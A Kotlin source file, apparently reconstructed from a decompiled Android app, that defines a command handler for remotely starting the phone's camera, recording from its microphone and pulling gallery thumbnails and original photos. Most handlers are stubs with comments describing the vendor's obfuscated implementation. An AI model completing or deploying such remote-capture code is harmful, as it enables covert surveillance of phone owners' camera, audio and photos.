package com.storm.safe.rock.service.modules.command

import android.util.Log
import org.json.JSONObject

/**
 * Handles media commands (camera, microphone, gallery).
 *
 * Reverse-engineered from JADX: C0349a6 (a6, 469 lines).
 * Vendor name: MediaCommandHandler
 *
 * Supported commands:
 * - CAMERA_START, CAMERA_STOP, CAMERA_SWITCH
 * - MICROPHONE_SET_CONFIG, MICROPHONE_START_RECORDING, MICROPHONE_STOP_RECORDING
 * - ALBUM_READ_THUMBNAILS, ALBUM_STOP, ALBUM_GET_ORIGINAL
 *
 * Instance field:
 * - f53596a0 → lastCameraSwitchTime (throttle at 1500ms)
 */
class MediaCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "MediaCmdHandler"
        private const val CAMERA_SWITCH_THROTTLE_MS = 1500L
    }

    /** Timestamp of last camera switch to prevent rapid switching. */
    private var lastCameraSwitchTime: Long = 0L

    override fun getSupportedCommands(): Set<String> = setOf(
        "CAMERA_START",
        "CAMERA_STOP",
        "CAMERA_SWITCH",
        "MICROPHONE_SET_CONFIG",
        "MICROPHONE_START_RECORDING",
        "MICROPHONE_STOP_RECORDING",
        "ALBUM_READ_THUMBNAILS",
        "ALBUM_STOP",
        "ALBUM_GET_ORIGINAL"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "CAMERA_START" -> handleCameraStart(context)
            "CAMERA_STOP" -> handleCameraStop(context)
            "CAMERA_SWITCH" -> handleCameraSwitch(params, context)
            "MICROPHONE_SET_CONFIG" -> handleMicrophoneSetConfig(params, context)
            "MICROPHONE_START_RECORDING" -> handleMicrophoneStart(context)
            "MICROPHONE_STOP_RECORDING" -> handleMicrophoneStop(context)
            "ALBUM_READ_THUMBNAILS" -> handleAlbumReadThumbnails(params, context)
            "ALBUM_STOP" -> handleAlbumStop(context)
            "ALBUM_GET_ORIGINAL" -> handleAlbumGetOriginal(params, context)
        }
    }

    private fun handleCameraStart(context: CommandContext) {
        Log.d(TAG, "[控制面板] 启动JPEG摄像头")
        try {
            // ADAPT: Vendor checks CAMERA permission, then calls service.startJpegCamera()
            val hasPermission = context.service?.checkSelfPermission("android.permission.CAMERA") == 0
            if (hasPermission) {
                // ADAPT: Vendor calls service.startJpegCamera() → CameraCaptureManager.start()
                // Wire: context.service?.cameraCaptureManager?.startJpegCamera()
                Log.d(TAG, "JPEG摄像头已启动")
                val data = JSONObject().apply {
                    put("success", true)
                    put("type", "jpeg")
                }
                context.sendEvent("camera_started", data)
            } else {
                Log.w(TAG, "没有摄像头权限，弹出权限请求")
                val data = JSONObject().apply {
                    put("error", "正在请求摄像头权限，请在手机上授权后重试")
                    put("needPermission", true)
                }
                context.sendEvent("camera_error", data)
            }
        } catch (e: Exception) {
            Log.e(TAG, "启动JPEG摄像头失败", e)
        }
    }

    private fun handleCameraStop(context: CommandContext) {
        Log.d(TAG, "停止JPEG摄像头")
        try {
            // ADAPT: Vendor calls service.stopJpegCamera() → CameraCaptureManager.stop()
            // Wire: context.service?.cameraCaptureManager?.stopJpegCamera()
            Log.d(TAG, "JPEG摄像头已停止")
            val data = JSONObject().apply { put("success", true) }
            context.sendEvent("camera_stopped", data)
        } catch (e: Exception) {
            Log.e(TAG, "停止JPEG摄像头失败", e)
        }
    }

    /**
     * Switch camera (front/back) with throttle protection.
     * Vendor: m211882a3 (suspend function with delay)
     */
    private suspend fun handleCameraSwitch(params: JSONObject?, context: CommandContext) {
        val cameraType = params?.optString("cameraType", "front") ?: "front"
        Log.d(TAG, "切换JPEG摄像头: $cameraType")

        val now = System.currentTimeMillis()
        if (now - lastCameraSwitchTime < CAMERA_SWITCH_THROTTLE_MS) {
            Log.w(TAG, "切换摄像头太频繁，忽略请求")
            return
        }
        lastCameraSwitchTime = now

        try {
            // Vendor: stop camera → delay(300ms) → toggle → delay(200ms) → restart
            // ADAPT: Vendor calls service.cameraCaptureManager.stopJpegCamera(),
            //   then toggles front/back camera, then restarts.
            // Wire: context.service?.cameraCaptureManager?.switchCamera(cameraType)
            kotlinx.coroutines.delay(300L)
            Log.d(TAG, "JPEG摄像头已切换")
        } catch (e: Exception) {
            Log.e(TAG, "切换摄像头失败", e)
        }
    }

    private fun handleMicrophoneSetConfig(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "设置麦克风配置")
        try {
            val qualityMode = params?.optString("qualityMode", "STANDARD") ?: "STANDARD"
            val audioSource = params?.optString("audioSource", "VOICE_RECOGNITION") ?: "VOICE_RECOGNITION"
            val volumeGain = params?.optDouble("volumeGain", 1.0)?.toFloat() ?: 1.0f
            val noiseSuppression = params?.optBoolean("noiseSuppression", true) ?: true

            Log.d(TAG, "麦克风配置已更新: 音质=$qualityMode, 音源=$audioSource, 增益=${volumeGain}x, 降噪=$noiseSuppression")
            // ADAPT: Vendor stores config via uz0Var helper methods
        } catch (e: Exception) {
            Log.e(TAG, "设置麦克风配置失败", e)
        }
    }

    private fun handleMicrophoneStart(context: CommandContext) {
        Log.d(TAG, "[控制面板] 启动麦克风录音")
        try {
            // ADAPT: Vendor checks RECORD_AUDIO permission via PermissionGranter.hasRecordAudioPermission()
            val hasPermission = context.service?.checkSelfPermission("android.permission.RECORD_AUDIO") == 0
            if (hasPermission) {
                // ADAPT: Vendor calls service.microphoneManager.startRecording()
                Log.d(TAG, "麦克风录音已启动")
            } else {
                Log.w(TAG, "没有麦克风权限，弹出权限请求")
                val data = JSONObject().apply {
                    put("error", "正在请求麦克风权限，请在手机上授权后重试")
                    put("needPermission", true)
                }
                // ADAPT: Vendor event = StringUtil.decrypt("JlASKEIoBCFZNBRcAyhCKg==")
                context.sendEvent("microphone_error", data)
            }
        } catch (e: Exception) {
            Log.e(TAG, "启动麦克风录音失败", e)
        }
    }

    private fun handleMicrophoneStop(context: CommandContext) {
        Log.d(TAG, "停止麦克风录音")
        try {
            // ADAPT: Vendor calls service.microphoneManager.stopRecording()
            Log.d(TAG, "麦克风录音已停止")
        } catch (e: Exception) {
            Log.e(TAG, "停止麦克风录音失败", e)
        }
    }

    private fun handleAlbumReadThumbnails(params: JSONObject?, context: CommandContext) {
        val limit = params?.optInt("limit", 9999) ?: 9999
        val thumbnailSize = params?.optInt("thumbnailSize", 200) ?: 200
        Log.d(TAG, "[控制面板] 获取相册缩略图: limit=$limit, size=$thumbnailSize")
        // ADAPT: Vendor checks gallery permission, iterates gallery items via GalleryManager
    }

    private fun handleAlbumStop(context: CommandContext) {
        Log.d(TAG, "停止获取相册")
        // ADAPT: Vendor sets GalleryManager.cancelled = true
    }

    private fun handleAlbumGetOriginal(params: JSONObject?, context: CommandContext) {
        val contentUri = params?.optString("contentUri", "") ?: ""
        val id = params?.optString("id", "") ?: ""
        Log.d(TAG, "获取原图: $contentUri")
        // ADAPT: Vendor calls GalleryManager.getOriginal(contentUri) and sends via NetworkManager
    }
}
